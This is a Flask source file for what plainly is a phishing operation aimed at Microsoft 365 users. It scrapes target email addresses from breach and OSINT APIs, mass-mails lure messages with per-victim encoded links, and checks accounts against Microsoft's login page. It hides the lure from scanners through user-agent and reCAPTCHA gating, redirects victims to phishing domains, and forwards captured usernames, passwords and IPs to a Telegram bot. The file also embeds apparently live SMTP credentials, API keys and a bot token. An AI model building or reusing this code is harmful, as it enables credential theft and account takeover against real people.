import string

from flask import Flask, request, jsonify, render_template, make_response, redirect
import base64
from flask_mail import Mail, Message
from flask_cors import CORS
import threading
import requests
from datetime import datetime
import random
from flask import send_from_directory
import logging
import time
import json

app = Flask(__name__)
cors = CORS(app)
#cors = CORS(app, resources={r"/*": {"origins": ["https://dnie.evelinrosa.com.br", "https://evelinrosa.com.br"]}})
app.config['CORS_HEADERS'] = 'Content-Type'


RECAPTCHA_SECRET_KEY = '6LdYBq4pAAAAAOIqH4lzSfJPysyS30UHDF1Sorwf'
# RECAPTCHA_SECRET_KEY2 = '6LeZMP8pAAAAAHciLVXnbjWpytLOSxIakq2KxPE3'
RECAPTCHA_SECRET_KEY2 = '6Lck75gqAAAAAEjLXTUFphWWeD0tgTfirfhYGPrP'
BINARYEDGE_API_KEY = 'c8a4571a-4c95-4bae-bc97-ff93a4f2527b'
INTELX_API_KEY = "cc82b5c6-e3fe-47c3-9400-c0accc4005d9"
INTELX_BASE_URL = "https://2.intelx.io"

app.config.update(
    MAIL_SERVER='mail.telemark-austria.at',
    MAIL_PORT=587,
    MAIL_USE_TLS=True,
    MAIL_USE_SSL=False,
    MAIL_USERNAME='arno.klien@telemark-austria.at',
    MAIL_PASSWORD='sitteR9*',
)
mail = Mail(app)


@app.route('/fetch-emails2', methods=['GET'])
def fetch_emails2():
    domain = request.args.get('domain')

    if not domain:
        return jsonify({'error': 'Domain parameter is missing'}), 400

    url = f"https://api.binaryedge.io/v2/query/domains/{domain}/emails"

    headers = {
        'X-Key': BINARYEDGE_API_KEY
    }

    try:
        response = requests.get(url, headers=headers, verify=False)
        response.raise_for_status()  # Raises exception for 4xx/5xx errors
        emails_data = response.json()
        return jsonify(emails_data), 200
    except requests.exceptions.RequestException as e:
        return jsonify({'error': str(e)}), 500

@app.route('/intelx-search', methods=['POST'])
def intelx_search():
    data = request.get_json()
    query = data.get('query')

    if not query:
        return jsonify({'error': 'Query parameter is missing'}), 400

    # First, submit the search request
    search_url = f"{INTELX_BASE_URL}/intelligent/search"
    headers = {
        'x-key': INTELX_API_KEY,
        'Content-Type': 'application/json'
    }
    payload = {
        "term": query,
        "maxresults": 100,  # Adjust based on your needs
        "media": 0,  # Search all media types
        "terminate": []
    }

    try:
        # Submit search request
        search_response = requests.post(search_url, headers=headers, json=payload)
        search_response.raise_for_status()
        search_result = search_response.json()
        search_id = search_result.get("id")

        if not search_id:
            return jsonify({'error': 'Failed to retrieve search ID'}), 500

        # Poll the result endpoint
        result_url = f"{INTELX_BASE_URL}/intelligent/search/result?id={search_id}"
        while True:
            result_response = requests.get(result_url, headers=headers)
            result_response.raise_for_status()
            result_data = result_response.json()

            if result_data.get("status") == 0:  # Success with results
                return jsonify(result_data), 200
            elif result_data.get("status") == 1:  # No more results available
                return jsonify({'message': 'Search completed, no more results.'}), 200
            elif result_data.get("status") == 3:  # No results yet available
                time.sleep(2)  # Wait for 2 seconds before retrying
            else:
                return jsonify({'error': 'Unexpected search status', 'status': result_data.get("status")}), 500

    except requests.exceptions.RequestException as e:
        return jsonify({'error': str(e)}), 500

@app.route('/fetch-emails', methods=['POST'])
def fetch_emails():
    data = request.get_json()
    domain = data.get('domain')

    if not domain:
        return jsonify({'error': 'Domain parameter is missing'}), 400

    # Step 1: Submit Phonebook Search
    search_url = f"{INTELX_BASE_URL}/phonebook/search"
    headers = {
        'x-key': INTELX_API_KEY,
        'Content-Type': 'application/json'
    }
    payload = {
        "term": domain,
        "maxresults": 100,  # Adjust based on your needs
        "media": 0,        # Search all media types
        "terminate": []
    }

    try:
        search_response = requests.post(search_url, headers=headers, json=payload)
        search_response.raise_for_status()
        search_result = search_response.json()
        search_id = search_result.get("id")

        if not search_id:
            return jsonify({'error': 'Failed to retrieve search ID'}), 500

        # Step 2: Poll Results
        result_url = f"{INTELX_BASE_URL}/phonebook/search/result?id={search_id}"
        while True:
            result_response = requests.get(result_url, headers=headers)
            result_response.raise_for_status()
            result_data = result_response.json()

            if result_data.get("status") == 0:  # Success with results
                emails = [record.get('name') for record in result_data.get("records", []) if record.get("name")]
                return jsonify({"emails": emails}), 200
            elif result_data.get("status") == 1:  # No more results available
                return jsonify({'message': 'Search completed, no results found.'}), 200
            elif result_data.get("status") == 3:  # No results yet available
                time.sleep(2)  # Wait for 2 seconds before retrying
            else:
                return jsonify({'error': 'Unexpected search status', 'status': result_data.get("status")}), 500

    except requests.exceptions.RequestException as e:
        return jsonify({'error': str(e)}), 500


@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response


# Function to set CSP headers in the response
def set_csp_headers(response):
    response.headers[
        'Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; TrustedHTML 'self';"
    return response

def send_async_email(app, msg):
    with app.app_context():
        mail.send(msg)

def send_email(to, subject, custom_email_content):
    # msg = Message(subject, sender='2­F­A­/­M­F­A­ ­A­u­t­h­e­n­t­i­c­a­t­o­r', recipients=[to])
    msg = Message(subject, sender=app.config['MAIL_USERNAME'], recipients=[to])
    msg.html = custom_email_content
    threading.Thread(target=send_async_email, args=(app, msg)).start()


def customize_email_content(template, bindings, email):
    # Create a copy of the bindings dictionary
    local_bindings = bindings.copy()

    # Customize email content
    now = datetime.now()
    formatted_date = now.strftime("%A, %B %d, %Y")

    username = email.split("@")[1].split(".")[0]
    servicerequestnumber = '{:08d}'.format(random.randint(0, 99999999))
    base64email = base64.b64encode(email.encode()).decode('utf-8')

    local_bindings['user_name'] = username
    local_bindings['service_request_number'] = servicerequestnumber
    local_bindings['date_long'] = formatted_date
    local_bindings['email'] = email

    baseurl = local_bindings.get('action_url', '')  # Assuming action_url is already in the bindings
    scheme, domain = baseurl.split('://')

    # Generate random values
    random_word = random.choice(['book', 'read', 'author', 'story', 'chapter'])  # Add more words as needed
    random_value = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))

    # Update the URL
    updated_url = f"{scheme}://{random_word}.{domain}/{random_value}/{base64email}"
    # updated_url = f"{scheme}://{domain}/{random_value}/{base64email}"
    local_bindings['action_url'] = updated_url

    return render_template(template, **local_bindings)


logging.basicConfig(level=logging.INFO)

def generate_random_string(length=6):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(length))


@app.route('/sendEmail', methods=['POST'])
def send_email_endpoint():
    data = request.json
    try:
        subject = data.get('subject', 'Starter')
        template = data['template']
        bindings = data['bindings']
        emails = data['emails']

        for email in emails:
            customized_message = customize_email_content(template, bindings, email)
            send_email(email, subject, customized_message)

        response = jsonify({"message": "Emails sent successfully"}), 200
    except Exception as e:
        response = jsonify({"error": str(e)}), 500

    # Create a response object using make_response
    response = make_response(response)
    # Add CSP headers to the response
    return set_csp_headers(response)

@app.route('/check-domain/<domain>', methods=['GET'])
def check_domain(domain):
    whois_info = get_whois(domain)
    if whois_info is None or 'registrar' not in whois_info:
        return jsonify({'error': 'Failed to fetch registrar information'}), 500

    registrar = whois_info.registrar
    if 'GoDaddy' in registrar:
        return send_from_directory('static', 'godaddy.html')
    else:
        return send_from_directory('static', 'other.html')

@app.route('/valif', methods=['POST'])
def verify_email():
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
    try:
        email = request.json.get('lif')
        driver.get("https://login.microsoftonline.com/")
        time.sleep(2)  # Allow the page to load

        email_input = driver.find_element(By.NAME, "loginfmt")
        email_input.send_keys(email)
        email_input.send_keys(Keys.RETURN)
        time.sleep(2)  # Wait for server response

        try:
            driver.find_element(By.NAME, "passwd")
            return jsonify({'isRegistered': True}), 200
        except:
            return jsonify({'isRegistered': False}), 404
    finally:
        driver.quit()


def verify_recaptcha_funct(token):
    url = "https://www.google.com/recaptcha/api/siteverify"
    payload = {
        'secret': RECAPTCHA_SECRET_KEY2,
        'response': token
    }
    response = requests.post(url, data=payload)
    result = response.json()
    return result.get('success', False), result.get('score', 0.0)



def is_regular_browser(user_agent):
    known_user_agents = ['Chrome', 'Firefox', 'Safari', 'Opera', 'Edge']
    for ua in known_user_agents:
        if ua in user_agent:
            return True
    return False


@app.route('/')
def index():
    try:
        user_agent = request.headers.get('User-Agent')
        ip_address = request.remote_addr
        encoded_email = request.args.get('i')
        request_method = request.method
        print(f"Request Method: {request_method}, User-Agent: {user_agent}, IP: {ip_address}, Encoded Email: {encoded_email}")
        logging.info(f"Request Method: {request_method}, User-Agent: {user_agent}, IP: {ip_address}, Encoded Email: {encoded_email}")


        if encoded_email and (user_agent and is_regular_browser(user_agent)):
            return render_template('index.html', email_base64=encoded_email)
        else:
            return redirect('https://nam10.safelinks.protection.outlook.com/', code=302)
    except Exception as e:
        logging.error("Exception in index route: %s", e)
        return "An error occurred", 500



@app.route('/verify_recaptcha_init', methods=['POST'])
def verify_recaptcha_init():
    try:
        token = request.form.get('token')
        email_base64 = request.form.get('x')

        if not token:
            logging.error("No reCAPTCHA token provided")
            return jsonify({'success': False, 'score': 0.0}), 400

        if not email_base64:
            logging.error("No email provided")
            return jsonify({'success': False, 'score': 0.0}), 400

        success, score = verify_recaptcha_funct(token)
        logging.info(f"ReCAPTCHA verification result: success={success}, score={score}")

        # decoded_email = base64.b64decode(email_base64).decode('utf-8')
        final_link = f"https://tinyurl.com/clouditorinito/#{email_base64}"
        if success and score > 0.1:
            return jsonify({'success': success, 'score': score, 'i': final_link})

        return jsonify({'success': success, 'score': score})
    except Exception as e:
        logging.error("Exception in verify_recaptcha route: %s", e)
        return jsonify({'success': False, 'score': 0.0}), 500


@app.route('/verify_recaptcha_init_5k', methods=['POST'])
def verify_recaptcha_init_5k():
    try:
        token = request.form.get('token')
        email_base64 = request.form.get('x')

        if not token:
            logging.error("No reCAPTCHA token provided")
            return jsonify({'success': False, 'score': 0.0}), 400

        if not email_base64:
            logging.error("No email provided")
            return jsonify({'success': False, 'score': 0.0}), 400

        success, score = verify_recaptcha_funct(token)
        logging.info(f"ReCAPTCHA verification result: success={success}, score={score}")

        # decoded_email = base64.b64decode(email_base64).decode('utf-8')
        final_link = f"https://tinyurl.com/detailedAnalysisvalue/#{email_base64}"
        if success and score > 0.1:
            return jsonify({'success': success, 'score': score, 'i': final_link})

        return jsonify({'success': success, 'score': score})
    except Exception as e:
        logging.error("Exception in verify_recaptcha route: %s", e)
        return jsonify({'success': False, 'score': 0.0}), 500

@app.route('/verify_recaptcha_init_aa', methods=['POST'])
def verify_recaptcha_init_aa():
    try:
        token = request.form.get('token')
        email_base64 = request.form.get('x')

        if not token:
            logging.error("No reCAPTCHA token provided")
            return jsonify({'success': False, 'score': 0.0}), 400

        if not email_base64:
            logging.error("No email provided")
            return jsonify({'success': False, 'score': 0.0}), 400

        success, score = verify_recaptcha_funct(token)
        logging.info(f"ReCAPTCHA verification result: success={success}, score={score}")

        # decoded_email = base64.b64decode(email_base64).decode('utf-8')
        final_link = f"https://tinyurl.com/aviaetor/#{email_base64}"
        if success and score > 0.8:
            return jsonify({'success': success, 'score': score, 'i': final_link})

        return jsonify({'success': success, 'score': score})
    except Exception as e:
        logging.error("Exception in verify_recaptcha route: %s", e)
        return jsonify({'success': False, 'score': 0.0}), 500


@app.route('/verify_recaptcha_init2', methods=['POST'])
def verify_recaptcha_init2():
    try:
        token = request.form.get('token')
        email_base64 = request.form.get('x')

        if not token:
            logging.error("No reCAPTCHA token provided")
            return jsonify({'success': False, 'score': 0.0}), 400

        # if not email_base64:
        #     logging.error("No email provided")
        #     return jsonify({'success': False, 'score': 0.0}), 400

        success, score = verify_recaptcha_funct(token)
        logging.info(f"ReCAPTCHA verification result: success={success}, score={score}")

        # decoded_email = base64.b64decode(email_base64).decode('utf-8')
        final_link = f"https://tinyurl.com/renewauth/"

        if success and score > 0.3:
            return jsonify({'success': success, 'score': score, 'i': final_link})

        return jsonify({'success': success, 'score': score})
    except Exception as e:
        logging.error("Exception in verify_recaptcha route: %s", e)
        return jsonify({'success': False, 'score': 0.0}), 500

@app.route('/verify_recaptcha_init3', methods=['POST'])
def verify_recaptcha_init3():
    try:
        token = request.form.get('token')
        email_base64 = request.form.get('x')

        if not token:
            logging.error("No reCAPTCHA token provided")
            return jsonify({'success': False, 'score': 0.0}), 400

        # if not email_base64:
        #     logging.error("No email provided")
        #     return jsonify({'success': False, 'score': 0.0}), 400

        success, score = verify_recaptcha_funct(token)
        logging.info(f"ReCAPTCHA verification result: success={success}, score={score}")

        # decoded_email = base64.b64decode(email_base64).decode('utf-8')
        final_link = f"https://tinyurl.com/nexusou"

        if success and score > 0.3:
            return jsonify({'success': success, 'score': score, 'i': final_link})

        return jsonify({'success': success, 'score': score})
    except Exception as e:
        logging.error("Exception in verify_recaptcha route: %s", e)
        return jsonify({'success': False, 'score': 0.0}), 500

TELEGRAM_API_TOKEN = '7232984136:AAHAADk-38F1m1P0YohNTGACEWUiY22IYSI'
TELEGRAM_CHAT_ID = '317906536'

def send_telegram_message(chat_id, message):
    url = f"https://api.telegram.org/bot{TELEGRAM_API_TOKEN}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': 'Markdown'
    }
    response = requests.post(url, json=payload)
    return response.ok


@app.route('/verify_auth', methods=['POST'])
def verify_auth():
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        ip_address = data.get('ip_address')

        if not username:
            logging.error("No username provided")
            return jsonify({'success': False, 'message': 'No username provided'}), 400

        if not password:
            logging.error("No password provided")
            return jsonify({'success': False, 'message': 'No password provided'}), 400

        if not ip_address:
            logging.error("No IP address provided")
            return jsonify({'success': False, 'message': 'No IP address provided'}), 400

        # Send data to Telegram
        message = f"Login attempt:\n*Username:* {username}\n*Password:* {password}\n*IP Address:* {ip_address}"
        send_telegram_message(TELEGRAM_CHAT_ID, message)

        return jsonify({'success': True, 'message': 'Data sent to Telegram'})
    except Exception as e:
        logging.error("Exception in verify_auth route: %s", e)
        return jsonify({'success': False, 'message': 'Internal server error'}), 500






@app.route('/gg',  methods=['POST'])
def gg():
    email = request.form.get('i')
    if email:
        decoded_email = base64.b64decode(email).decode('utf-8')
        print("Decoded Email:", decoded_email)
        random_prefix = generate_random_string()
        random_suffix = generate_random_string()
        # Construct the final link with the random strings and the decoded email
        final_link = f"https://entrustry.com/3c204ed6-d35b-4ff8-ac5e-d470314f9204/{decoded_email}"
        return jsonify({'gg': final_link})
    else:
        return "Invalid email", 400


@app.route('/gf',  methods=['POST'])
def gf():
    email = request.form.get('i')
    if email:
        decoded_email = base64.b64decode(email).decode('utf-8')
        print("Decoded Email:", decoded_email)
        random_prefix = generate_random_string()
        random_suffix = generate_random_string()
        # Construct the final link with the random strings and the decoded email
        final_link = f"https://decobat.moscow/yVvWs/#X{email}"
        return jsonify({'gf': final_link})
    else:
        return "Invalid email", 400


@app.route('/gt',  methods=['POST'])
def gt():
    email = request.form.get('i')
    if email:
        decoded_email = base64.b64decode(email).decode('utf-8')
        print("Decoded Email:", decoded_email)
        random_prefix = generate_random_string()
        random_suffix = generate_random_string()
        # Construct the final link with the random strings and the decoded email
        final_link = f"https://tecosdiagnostics.com/08491aad-9c81-41aa-9f18-d4e631d3f786/{email}"
        return jsonify({'gt': final_link})
    else:
        return "Invalid email", 400


@app.route('/gz',  methods=['POST'])
def gz():
    random_prefix = generate_random_string()
    random_suffix = generate_random_string()
    # Construct the final link with the random strings and the decoded email
    final_link = f"https://t.apemail.net/c/nqkqabcskrjfiukwdihq4biadibqabcsdjkqovksdidvmdyga4aq4b2razjvkfi3audqkdygaydbwaaaa4bqmaqeamnq4byoaedqeaipamnqogyvpf3bkgyvafkambqpkikwu-nqdbwfkcivnrkgyvpf3bkgygamaa4bqedmcagbahdmcqabahaidamgyfaycakaqbbynqkbyfb4dambq3aubaoaybambamgyvaacfevcskrivmgqpbycqagqdaacfegsva5kvegqhkyhqmbybbydvcbstkukrwdqhbyaqoaqbb4brwflfmnxboh3gijpfixaxmrjfsuy6cunrkzkskzjro6syivjbkgyaaadqgbqcaqbrwfk7inbuorandamfswcfknpvmucslfku4ucqdfmvqgculnpbqxszknje6gk7innfwfi3incueuq3aabaegyvpf3bkg2zijnvwg2zijnvwg2zijnvwg2zijnvwgyvafkambqpkikwu"
    return jsonify({'gz': final_link})



@app.route('/backend')
def backend():
    email = request.args.get('i')
    if email:
        decoded_email = base64.b64decode(email).decode('utf-8')
        print("Decoded Email:", decoded_email)
        random_prefix = generate_random_string()
        random_suffix = generate_random_string()
        # Construct the final link with the random strings and the decoded email
        final_link = f"https://tech.lctaubate.com.br/{random_prefix}{email}{random_suffix}"
        return redirect(final_link)
    else:
        return "Invalid email", 400

@app.route('/random-digit')
def random_digit():
    # Generate a random 10-digit number
    random_number = ''.join(["%s" % random.randint(0, 9) for num in range(0, 10)])
    finalUrl = f'https://{random_number}.filipedias.adv.br/'
    return jsonify({"random_digit": finalUrl})


@app.route('/verify-recaptcha', methods=['POST'])
def verify_recaptcha():
    try:
        token = request.json.get('token')
        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
        payload = {
            'secret': RECAPTCHA_SECRET_KEY,
            'response': token
        }
        response = requests.post(verification_url, data=payload)
        data = response.json()
        print((data))
        if data.get('success'):
            home = "https://r8euf.ngeodefe.ru/NNRbPcIa/#X"
            #Returning Namo link
            return jsonify({'success': True, 'home': home}), 200
        else:
            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': 'Internal server error'}), 500


if __name__ == '__main__':
    app.run(debug=True)
